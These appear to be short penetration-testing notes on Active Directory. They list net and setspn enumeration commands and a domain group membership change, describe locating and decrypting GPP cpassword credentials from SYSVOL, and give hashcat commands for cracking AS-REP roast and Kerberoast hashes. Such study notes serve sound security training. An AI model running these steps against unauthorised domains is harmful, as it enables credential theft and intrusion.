# Active Directory

## Enumeration

### Local Commands

```powershell
# Print users within the current domain
net user /domain

# Check domain user information
net user offsec /domain

# Check domain groups
net group /domain

# Check domain group members
net group "Sales Department" /domain

# Enumerate SPNs for user `iis_service`
setspn -L iis_service

# Check account lockout policy
net accounts

# Add and remove "setphanie" from "Management Department"
net group "Management Department" stephanie /add /domain
net group "Management Department" stephanie /del /domain
```

### Tools

#### [PowerView](0%20Tools/PowerView.md)

#### [gpp-decrypt](0%20Tools/gpp-decrypt.md)

Decrypts GPP credentials. Typically found in files like `Groups.xml`, `Services.xml`, `Scheduledtasks.xml`, `DataSources.xml`, `Printers.xml`, and `Drives.xml`.

Key things to look for:

- **File Location:** GPP files are usually found in the `SYSVOL` folder on a domain controller, under the path `\\[DOMAIN]\SYSVOL\[DOMAIN]\Policies\`.
- **cpassword Attribute:** Within these XML files, look for the `cpassword` attribute. This attribute holds the encrypted form of the password.
- **XML Structure:** The structure of the XML file can give you a hint. For example, in a `Groups.xml` file, you might see something like:

```xml
<Group ...>
  <Properties ... cpassword="EDUYJgCbgCAmO5E..." ... />
</Group>
```

Decrypt with:

```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

#### [BloodHound](0%20Tools/BloodHound.md)

#### [Rubeus](0%20Tools/Local/Rubeus.md)

Crack associated hashes in hashcat

```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
